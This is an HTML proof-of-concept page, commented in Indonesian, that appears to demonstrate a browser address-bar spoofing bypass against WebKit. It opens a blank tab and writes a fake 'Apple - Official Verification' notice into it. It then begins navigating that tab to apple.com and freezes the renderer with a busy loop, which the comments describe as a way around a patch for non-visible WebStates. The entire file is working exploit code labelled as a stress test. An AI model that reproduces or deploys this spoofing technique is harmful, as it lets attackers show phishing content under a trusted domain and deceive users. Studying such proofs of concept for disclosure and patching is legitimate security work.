<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1, user-scalable=yes"
    />
    <title>Advanced Bypass PoC - Zero</title>
    <style>
      body, html {
        margin: 0;
        padding: 0;
        height: 100%;
        background: #000;
        color: #fff;
        font-family: -apple-system, BlinkMacSystemFont, sans-serif;
        display: flex;
        align-items: center;
        justify-content: center;
      }
      button {
        padding: 24px 48px;
        font-size: 22px;
        font-weight: bold;
        background: #ff3b30;
        color: #fff;
        border: none;
        border-radius: 16px;
        cursor: pointer;
        box-shadow: 0 8px 24px rgba(255, 59, 48, 0.4);
        transition: transform 0.1s ease;
      }
      button:active {
        transform: scale(0.95);
      }
    </style>
  </head>
  <body>

    <button id="startBtn">EXECUTE BYPASS STRESS TEST</button>

    <script>
      document.getElementById("startBtn").onclick = function () {
        this.style.display = 'none';

        // 1. Membuka tab baru (about:blank)
        const newTab = window.open("about:blank", "_blank");

        if (newTab) {
          // 2. Menyuntikkan konten kustom penyerang
          newTab.document.write(`
            <!DOCTYPE html>
            <html>
            <head>
              <title>Apple - Official Verification</title>
              <meta name="viewport" content="width=device-width, initial-scale=1">
            </head>
            <body style="margin:0;padding:0;background:#ffffff;display:flex;align-items:center;justify-content:center;height:100vh;text-align:center;font-family:-apple-system,sans-serif;">
              <div>
                <h1 style="font-size:46px;font-weight:700;color:#1d1d1f;margin:0 0 16px 0;">Critical Notice</h1>
                <p style="font-size:22px;color:#86868b;margin:0;">Verifying secure enclave status...</p>
              </div>
            </body>
            </html>
          `);
          newTab.document.close();

          // 3. Memaksa perpindahan fokus secara instan agar WebState berstatus PRIMARY/VISIBLE 
          // (Mengelabui pengecekan patch "Non-visible WebStates")
          try {
            newTab.focus();
          } catch (e) {}

          // 4. Memicu navigasi asinkron ke domain target (apple.com)
          setTimeout(() => {
            try {
              newTab.location.href = "https://apple.com";
            } catch (err) {
              console.error(err);
            }
          }, 20);

          // 5. BYPASS PATCH: Menggunakan Heavy Synchronous CPU/DOM Reflow Block 
          // sebagai pengganti prompt() untuk membekukan event loop renderer secara total
          setTimeout(() => {
            try {
              newTab.eval(`
                // Memaksa thread utama terkunci tanpa memicu API dialog yang ditambal
                const startTime = Date.now();
                while (Date.now() - startTime < 3000) {
                  // Stress test DOM reflow agar engine WebKit gagal mengirimkan lifecycle callback
                  document.body.style.background = (Date.now() % 2 === 0) ? '#ff0000' : '#ffffff';
                }
              `);
            } catch (e) {
              // Fallback internal jika eval dibatasi
              let start = Date.now();
              while (Date.now() - start < 3000) {}
            }
          }, 150);
        }
      };
    </script>
  </body>
</html>
